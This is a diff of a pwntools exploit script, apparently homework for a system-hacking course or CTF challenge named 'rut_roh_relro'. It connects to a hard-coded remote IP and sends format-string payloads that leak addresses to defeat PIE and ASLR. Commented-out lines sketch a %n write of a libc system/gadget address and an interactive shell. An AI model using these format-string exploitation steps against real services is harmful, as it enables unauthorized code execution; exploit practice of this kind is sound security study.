@@ -3,20 +3,38 @@ from pwn import *
 port = 5000
 rem = remote("52.79.50.147", port)
 
-elf = ELF("./WHS/system_hacking_hw/problem/libc.so.6")
-# print(elf.symbols[b"__libc_start_main"])
-# print(list(elf.search(b"main")))
-start_offset = 6496
+elf = ELF("./WHS/system_hacking_hw/problem/rut_roh_relro")
+start_offset = elf.symbols["_start"]
+main_offset = elf.symbols["main"]
 
-payload = b"%71$p"
+elf = ELF("./WHS/system_hacking_hw/problem/libc.so.6")
+libstart_offset = 6496
+system_offset = 0xc961a
+
+payload = b"%97$p"
 rem.sendlineafter(b"post?", payload)
 rem.recvuntil(b"post:\n")
-ret_addr = int(rem.recv(14), 16) - 243
-lib_base = ret_addr - start_offset
-print(p64(ret_addr))
-print(p64(lib_base))
+start_addr = int(rem.recv(14), 16) - 42
+pie_base = start_addr - start_offset
+main_addr = pie_base + main_offset
+print(p64(start_addr))
+print(p64(pie_base))
 
-payload = b"hi" 
+# payload = b"%71$p"
+# rem.sendlineafter(b"post?", payload)
+# rem.recvuntil(b"post:\n")
+# ret_addr = int(rem.recv(14), 16) - 243
+# lib_base = ret_addr - libstart_offset
+# print(p64(ret_addr))
+# print(p64(lib_base))
+
+# system_addr = lib_base + system_offset
+# print(p64(system_addr))
+# payload = "%{}c".format(system_addr).encode()
+# payload += b"%71$n"
+payload = b"hi"
+print(payload)
 rem.sendlineafter(b"post?\n", payload)
 msg = rem.recvline()
-print(msg)
+
+# rem.interactive()
